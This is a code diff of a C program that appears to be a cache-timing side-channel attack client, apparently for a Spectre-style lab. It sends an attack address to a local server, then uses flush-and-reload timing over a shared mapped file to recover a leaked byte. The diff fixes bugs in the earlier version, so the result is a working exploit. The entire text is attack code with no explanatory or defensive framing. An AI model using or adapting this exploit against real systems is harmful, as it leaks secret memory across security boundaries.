@@ -1,4 +1,7 @@
 #include <stdio.h>
+#include <fcntl.h>
+#include <sys/socket.h>
+#include <netdb.h>
 #include "cache.h"
 #include "utils.h"
 
@@ -24,43 +27,46 @@ int main(int argc, char *const argv[]) {
         usage();
 
     char *end;
-    size_t addr = strtoul(argv[2], &end, 0);
+    size_t attack_addr = strtoul(argv[2], &end, 0);
     if (*end != '\0')
         usage();
     const char *target = argv[3];
     size_t offset = strtoul(argv[4], &end, 0);
     if (*end != '\0')
         usage();
-    const char *mem = map_file(target, offset);
+    char *mem = map_file(target, offset);
 
-    int sock = socket(PF_INET, SOCK_STREAM, 0); check("socket");
+    int sock = socket(AF_INET, SOCK_STREAM, 0); check("socket");
+    struct addrinfo hints = {.ai_family = AF_INET, .ai_socktype = SOCK_STREAM};
     struct addrinfo *addr;
-    getaddrinfo("localhost", argv[1], NULL, &addr); check("getaddrinfo");
+    getaddrinfo("localhost", argv[1], &hints, &addr); check("getaddrinfo");
     connect(sock, addr->ai_addr, addr->ai_addrlen); check("connect");
-    char buf[100];
-    int len = sprintf(buf, "%d 0\n", addr);
+    FILE *sockf = fdopen(sock, "r+");
 
     char hist[256] = {};
-    for (int i = 0; i < 100; i++) {
-        // send some commands
-        for (int i = 0; i < 1000; i++)
-            write(sock, buf, len);
+    int max = 0;
+    unsigned char ch = 0;
+    while (max < 5) {
+        // send some things
+        char buf[100];
+        for (int i = 0; i < 10; i++) {
+            fprintf(sockf, "%ld 0\n", attack_addr);
+            fflush(sockf);
+            fgets(buf, sizeof(buf), sockf);
+        }
         // observe the results
         for (int j = 0; j < 256; j++) {
             int i = ((j * 167) + 13) & 0xff;
             char *ptr = &mem[i * 0x100];
             uint64_t clocks = time_load(ptr);
             flush(ptr);
-            if (clocks < THRESHOLD)
+            if (clocks < THRESHOLD) {
                 hist[i]++;
-        }
-    }
-    int max = 0; 
-    unsigned char ch = 0;
-    for (int i = 0; i < 256; i++) {
-        if (hist[i] > max) {
-            max = hist[i];
-            ch = i;
+                if (hist[i] > max) {
+                    max = hist[i];
+                    ch = i;
+                }
+            }
         }
     }
     printf("%c %d\n", ch, max);
